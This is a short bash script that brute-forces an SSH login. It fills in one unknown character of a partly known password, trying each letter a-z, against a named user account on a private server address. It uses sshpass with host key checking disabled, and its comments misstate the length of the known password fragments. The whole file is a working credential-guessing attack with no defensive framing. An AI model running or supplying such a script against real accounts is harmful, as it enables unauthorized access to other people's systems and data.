#!/bin/bash

# The known parts of the password
FIRST_PART="azbob"    # Replace with the known first three characters
LAST_PART="qy"    # Replace with the known last four characters

# The target user and server
USER="s2022103554"  # Replace with the username
HOST="10.5.12.254" # Replace with the server IP or hostname

# Loop through possible lowercase characters (a-z) for the missing fourth character
for char in {a..z}; do
    # Construct the full password by inserting the missing fourth character
    FULL_PASSWORD="${FIRST_PART}${char}${LAST_PART}"

    echo "Trying password: $FULL_PASSWORD"

    # Try to SSH with the constructed password using sshpass (if installed)
    sshpass -p "$FULL_PASSWORD" ssh -o StrictHostKeyChecking=no "$USER@$HOST" exit

    # Check the exit status of SSH
    if [ $? -eq 0 ]; then
        echo "Password found: $FULL_PASSWORD"
        exit 0
    fi
done

echo "Password not found."
